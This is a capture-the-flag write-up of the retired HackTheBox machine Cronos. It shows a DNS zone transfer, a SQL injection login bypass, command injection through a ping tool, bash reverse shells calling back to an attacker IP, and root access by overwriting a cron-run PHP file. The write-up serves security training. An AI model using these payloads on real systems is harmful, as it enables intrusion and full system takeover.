# HackTheBox — Cronos

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**Category:** Web Exploitation / SQLi / Cron Job Abuse  
**Status:** Retired  

---

## Summary

Cronos is a Linux machine that requires DNS zone transfer enumeration to discover a hidden subdomain, SQL injection bypass to access an admin panel, command injection for an initial foothold, and privilege escalation via a root-owned cron job executing a writable PHP file.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/cronos 10.10.10.13
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
53/tcp open  domain  ISC BIND 9.10.3-P4
80/tcp open  http    Apache httpd 2.4.18
```

Port 53 is open — DNS zone transfer is worth trying.

---

## DNS Enumeration

### Zone Transfer

```bash
# Identify the domain
nslookup
> server 10.10.10.13
> 10.10.10.13
# Returns: cronos.htb

# Attempt zone transfer
dig axfr @10.10.10.13 cronos.htb
```

```
cronos.htb.     604800  IN  SOA   cronos.htb. ...
cronos.htb.     604800  IN  A     10.10.10.13
admin.cronos.htb. 604800 IN A    10.10.10.13
www.cronos.htb. 604800  IN  A     10.10.10.13
```

`admin.cronos.htb` is exposed via zone transfer.

Add to `/etc/hosts`:

```
10.10.10.13  cronos.htb admin.cronos.htb
```

---

## Web Exploitation

### Admin Panel — SQLi Login Bypass

Visiting `http://admin.cronos.htb` shows a login form.

Test SQL injection in the username field:

```
Username: admin' -- -
Password: anything
```

**Login succeeds** — classic SQLi authentication bypass.

### Command Injection — Net Tool

After login, the admin panel shows a "Net Tool" with options for `traceroute` and `ping` and an IP input field.

Test for command injection:

```
8.8.8.8; id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Command injection confirmed.**

### Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Payload in the IP field
8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

Shell as **www-data**.

---

## Privilege Escalation

### Cron Jobs

```bash
cat /etc/crontab
```

```
* * * * *  root  php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

Root is running a PHP file every minute. Check permissions:

```bash
ls -la /var/www/laravel/artisan
# -rwxr-xr-x 1 www-data www-data 1686 Apr  9 2017 artisan
```

`www-data` owns the file — we can overwrite it!

### Exploit the Cron

```bash
echo '<?php exec("bash -c '"'"'bash -i >& /dev/tcp/10.10.14.X/5555 0>&1'"'"'"); ?>' \
  > /var/www/laravel/artisan
```

Start a new listener:

```bash
nc -lvnp 5555
```

Wait up to 60 seconds — **root shell obtained**.

---

## Flags

```bash
cat /home/noulis/user.txt
cat /root/root.txt
```

---

## Key Takeaways

- **DNS zone transfers** on port 53 can reveal hidden subdomains — always try `dig axfr`
- SQLi login bypasses are still alive in the wild — test `' -- -` and `' OR 1=1 -- -`
- When user input is passed to a system command, test for `;`, `|`, `&&` injection
- Cron jobs running as root with writable scripts are a direct path to privilege escalation
- Always `cat /etc/crontab` and check `/var/spool/cron/crontabs/` during privesc

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| dig | DNS zone transfer |
| Browser / Burp Suite | SQLi & command injection testing |
| netcat | Reverse shell listener |
